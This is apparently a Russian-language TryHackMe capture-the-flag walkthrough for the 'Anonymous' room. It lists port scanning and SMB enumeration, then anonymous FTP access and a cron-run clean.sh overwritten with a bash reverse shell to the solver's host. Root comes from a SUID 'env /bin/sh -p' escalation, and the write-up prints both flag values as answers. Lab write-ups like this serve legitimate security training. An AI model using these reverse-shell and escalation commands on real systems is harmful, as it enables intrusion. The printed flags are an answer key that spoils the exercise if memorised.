[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Anonymous](https://tryhackme.com/r/room/anonymous) 

Всего 1 заданиe:
## Задание 1
Попробуйте получить оба флага! Получите права root на машину и докажите, что вы понимаете основы! Это виртуальная 
машина, предназначенная для новичков. Получение обоих флагов потребует некоторых базовых знаний Linux и методов 
повышения привилегий.
-------------------------------------------------- ------------------
Для получения дополнительной информации о Linux посетите страницу  Learn Linux.

### Ответьте на вопросы ниже
Перечислите машины. Сколько портов открыто?
```commandline
nmap -sC -sV -p- <IP>
```
```commandline
4
```
Какая служба работает на порту 21?
```commandline
ftp
```
Какая служба работает на портах 139 и 445?
```commandline
smb
```
На компьютере пользователя есть общий ресурс. Как он называется?
```commandline
smbclient -L <IP>
```
```commandline
pics
```
пользователь.txt
```commandline
ftp 10.10.64.21
ls -la
cd scripts
ls -la
mget *
y
cat clean.sh 
cat removed_files.log 
cat to_do.txt 

vim clean.sh 
#!/bin/bash
bash -i >& /dev/tcp/<my_own_IP>/4444 0>&1
nc -nlvp 4444
ls
cat user.txt
```
```commandline
90d6f992585815ff991e68748c414740
```
корень.txt
```commandline
crontab -l
find / -user root -perm -u=s 2>/dev/null
env /bin/sh -p
cat /root/root.txt
```
```commandline
4d930091c31a622a7ed10f27999af363
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)